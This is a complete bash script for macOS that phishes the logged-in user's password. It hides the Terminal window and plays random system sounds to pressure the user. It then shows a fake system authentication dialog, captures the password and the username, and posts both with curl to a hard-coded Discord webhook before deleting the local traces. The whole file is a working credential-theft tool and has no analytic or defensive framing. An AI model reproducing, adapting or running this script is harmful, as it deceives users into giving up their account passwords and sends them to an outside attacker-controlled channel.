#!/bin/bash

# Hide Terminal so that only the AppleScript dialog is visible
osascript -e 'tell app "Terminal" to set visible of front window to false'

# Get current username
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

# Prepare header for captured data
capture="username=${username}\n_________________________________________________________________________________________\n\n"

# Temporary file to store the entered password
tmpfile="/tmp/user_pass.txt"
rm -f "$tmpfile"

# Define an array of system sound files (adjust if needed)
sounds=("Basso.aiff" "Funk.aiff" "Glass.aiff" "Ping.aiff" "Pop.aiff" "Submarine.aiff")

# Background function to play random noises until password is entered
play_noises() {
    while [ ! -f "$tmpfile" ]; do
        # Choose a random sound from the array
        rand_index=$(( RANDOM % ${#sounds[@]} ))
        sound_file="/System/Library/Sounds/${sounds[$rand_index]}"
        # Play the sound (afplay blocks until the sound finishes)
        afplay "$sound_file"
        sleep 0.5
    done
}

# Start the background noise loop
play_noises &
noise_pid=$!

# Launch the password prompt using AppleScript and save the output to tmpfile
osascript -e 'set userPassword to text returned of (display dialog "MacOS is trying to authenticate user.
Enter the password for user " & (long user name of (system info)) & ":" with hidden answer)' > "$tmpfile"

# After the password prompt completes, kill the noise loop if it's still running
kill $noise_pid 2>/dev/null

# Retrieve the entered password
userPassword=$(cat "$tmpfile")
rm "$tmpfile"

# Append the password to the capture text
capture="${capture}password=${userPassword}"

# Save captured data to pass.txt
echo -e "$capture" > pass.txt

# Use Python to format valid JSON and send the payload via the Discord webhook
if [[ -f pass.txt ]]; then
    payload=$(python3 -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
    curl -X POST -H "Content-Type: application/json" -d "$payload" https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B
    rm pass.txt
else
    echo "Error: pass.txt not found" > error.txt
fi
